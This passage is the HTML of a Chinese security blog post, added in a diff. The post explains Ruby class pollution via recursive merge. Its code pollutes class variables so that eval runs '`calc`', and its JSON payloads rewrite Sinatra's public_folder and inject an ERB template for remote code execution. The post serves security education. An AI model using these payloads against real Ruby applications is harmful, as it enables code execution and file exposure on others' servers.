+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">check</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="no">Base</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># eval(@@cmd)  污染失败</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ok&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于这种情况，可以污染父类的cmd变量，但这里实际上是给父类Base增加了一个实例变量<code>@cmd</code>，从而通过<code>Base.cmd</code>访问时，实例变量<code>@cmd</code>遮盖了类变量<code>@@cmd</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="no">Cmder</span><span class="o">.</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">merge_with</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;class&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                 <span class="s2">&#34;superclass&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                   <span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="s2">&#34;`calc`&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="p">}</span>
+</span></span><span class="line"><span class="cl">               <span class="p">}</span>
+</span></span><span class="line"><span class="cl">             <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">check</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">Base</span><span class="o">.</span><span class="n">class_variables</span>  <span class="c1"># @@cmd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">Base</span><span class="o">.</span><span class="n">instance_variables</span>  <span class="c1"># @cmd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="污染其他类">污染其他类
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Cmder</span>
+</span></span><span class="line"><span class="cl">  <span class="vc">@@cmd</span> <span class="o">=</span> <span class="s2">&#34;puts 1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">check</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="no">Cmder</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Innocent</span>
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>subclasses</code>可以获取到Object的子类，但返回的是数组，可以利用数组的<code>sample</code>方法，随机返回一个元素</p>
+<p>通过多次污染，总有几率污染到<code>Cmder</code>这个子类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">1000</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="n">i</span> <span class="o">=</span> <span class="no">Innocent</span><span class="o">.</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl">  <span class="n">i</span><span class="o">.</span><span class="n">merge_with</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                 <span class="s2">&#34;class&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                   <span class="s2">&#34;superclass&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="s2">&#34;subclasses&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;sample&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="s2">&#34;`calc`&#34;</span>
+</span></span><span class="line"><span class="cl">                       <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                 <span class="p">}</span>
+</span></span><span class="line"><span class="cl">               <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="no">Cmder</span><span class="o">.</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">check</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Doyensec的文章中提到了污染<code>Person</code>的<code>url</code>变量来进行SSRF，以及污染<code>KeySigner</code>的<code>signing_key</code>变量来实现伪造签名数据。</p>
+<h2 id="类污染设置静态目录">类污染设置静态目录
+</h2><p><code>Sinatra</code>框架中是通过如下配置来设置静态目录的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">set</span> <span class="ss">:public_folder</span><span class="p">,</span> <span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="bp">__FILE__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/static&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进<code>set</code>方法可以发现他实际就是给<code>Sinatra::Base</code>设置了一个属性的getter、setter</p>
+<p><code>class_eval</code>给类动态定义方法</p>
+<p>因此可以污染<code>public_folder</code>这个属性来修改静态目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;class&#34;</span><span class="p">:{</span><span class="s2">&#34;superclass&#34;</span><span class="p">:{</span><span class="s2">&#34;superclass&#34;</span><span class="p">:{</span><span class="s2">&#34;subclasses&#34;</span><span class="p">:{</span><span class="s2">&#34;sample&#34;</span><span class="p">:{</span><span class="s2">&#34;public_folder&#34;</span><span class="p">:</span> <span class="s2">&#34;E:/Server&#34;</span><span class="p">}}}}}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="类污染写erb模板">类污染写ERB模板
+</h2><p>调试可知<code>Sinatra::Base</code>有个<code>templates</code>属性，类型是哈希，猜测他是存放模板的</p>
+<p><code>Sinatra</code> 默认模板位于<code>./views</code>目录，也支持通过如下语句定义模板</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">template</span> <span class="ss">:index</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;%div.title Hello World!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到<code>template</code>方法实际就是给<code>templates</code>这个属性赋值（block是个代码块，需要返回模板内容的字符串）</p>
+<p>有如下渲染模板的路由</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="n">erb</span> <span class="ss">:hello</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ERB (Embedded Ruby) 是 Ruby 标准库自带的，它允许在文本文件中嵌入 Ruby 代码，通常用于生成 HTML 文件，就是一个模板引擎。</p>
+<p>可以污染<code>templates</code>属性，覆盖<code>hello</code>模板，通过ERB模板实现RCE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;class&#34;</span><span class="p">:{</span><span class="s2">&#34;superclass&#34;</span><span class="p">:{</span><span class="s2">&#34;superclass&#34;</span><span class="p">:{</span><span class="s2">&#34;subclasses&#34;</span><span class="p">:{</span><span class="s2">&#34;sample&#34;</span><span class="p">:{</span><span class="s2">&#34;templates&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;hello&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;%= `calc` %&gt;&#34;</span><span class="p">}}}}}}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E7%B1%BB%E6%B1%A1%E6%9F%93/">类污染</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/ruby%E7%9A%84erb%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ruby%E7%9A%84erb%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.f7e03e4b6a34136197043a2e95e0ccfd.png" 
+                        width="1024" 
+                        height="1536" 
+                        loading="lazy"
+                        alt="Featured image of post Ruby的ERB模板注入"
+                        
+                        data-hash="md5-9&#43;A&#43;S2o0E2GXBDouleDM/Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ruby的ERB模板注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
